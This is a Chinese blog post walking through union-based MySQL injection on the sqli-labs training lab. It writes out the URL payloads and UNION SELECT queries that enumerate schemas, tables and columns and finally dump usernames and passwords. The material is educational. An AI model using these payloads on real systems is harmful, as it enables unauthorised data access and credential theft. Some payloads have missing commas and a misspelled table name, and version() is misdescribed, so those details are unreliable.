---
title: Mysql injection
date: 2019-07-01 16:35:53
tags: 
category: websec
---
基于 MYSQL的 注入漏洞
<!-- more -->

对于有回显的注入漏洞，我们可以通过联合查询，获取数据库数据,以 sqli-labs 第一关的实验为例子

# ![image.png](https://cdn.nlark.com/yuque/0/2019/png/290091/1557843049567-dd99a231-caaf-47e3-828a-4f6c94170898.png#align=left&display=inline&height=303&name=image.png&originHeight=606&originWidth=2288&size=474017&status=done&width=1144)
**0x01 通过错误显示，我们可以进行单引号的测试（%23为#是 mysql 里面注释符号）**
```
// 真假条件测试
http://192.168.50.46:8081/Less-1/?id=1%27%20and%201=1%20%23
http://192.168.50.46:8081/Less-1/?id=1%27%20and%201=2%20%23
```
**0x02 接下来就要猜测数据库表有几行**
```
http://192.168.50.46:8081/Less-1/?id=1%20%27%20%20order%20by%204%20%23
// 解析出来就是
http://192.168.50.46:8081/Less-1/?id=1 ' order by 4 #
```
可以看到页面错误![image.png](https://cdn.nlark.com/yuque/0/2019/png/290091/1557843772120-ed92ba94-4001-4e61-972a-ef4e28f6d4f1.png#align=left&display=inline&height=275&name=image.png&originHeight=550&originWidth=2174&size=378950&status=done&width=1087)
最后得出其行数为 3 行。 
**0x03 记下来需要查看显示的字段，存在数据库的第几行。**
这里还涉及到 mysql的几个小知识点：

1. `select 1,2,3,4`  语句是 mysql 里面的打印语句，当你数据库没有数据，你有几行就可以按顺序打印
1. 根据需求，需要将这道题的 `id` 设置为不存在，否则将只打印数据库存在的字段，而不是1，2，3
```
// 设置 id 为0 select 1,2,3 %23
http://192.168.50.46:8081/Less-1/?id=0%20%27%20%20union%20select%201,2,3%23
```
得到
![image.png](https://cdn.nlark.com/yuque/0/2019/png/290091/1557844250750-fffa777f-d20f-43ae-a06b-87190e3a01b8.png#align=left&display=inline&height=339&name=image.png&originHeight=678&originWidth=2282&size=410162&status=done&width=1141)
**0x04 通过关键函数获取信息**
`user()` 当前连接数据库的用户
`database()` 当前数据库的名称
`version()` 当前数据库名
连接函数：
`concat()` 
`concat_ws()` 
`group_concat()` 
使用下面的 POC
```
union select 1,2 concat_ws(char(58),user(),database(),version()) # 
union select 1,2, group_concat(user(),":",database(),":",version()) #
```
得到
![image.png](https://cdn.nlark.com/yuque/0/2019/png/290091/1557844703408-c06d0725-849d-4c62-a225-e61f4ddbecf0.png#align=left&display=inline&height=338&name=image.png&originHeight=676&originWidth=2288&size=531945&status=done&width=1144)
**0x05 获取表信息**
`information_schema.schemata`  存储了所有数据库名
`information_schame.tables`  存储了所有的数据库表，通过其字段名称 `table_name` ，可以查到所有的表
`information_schema.columns` 存储了所有字段，通过 `column_name` 可以查到所有的字段名

1. 获取数据库名
```
union select 1,2,(select group_concat(schema_name) from information_schema.schemata) #
```

2. 获取表名
```
union select 1,2 (select group_concat(table_name) from information_schema.tables where table_schema="security") #
```

3. 获取列信息
```
union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name="users") #
```

4. 获取数据
```
union select 1,2 (select group_concat(username,":",password) from users) # 
```


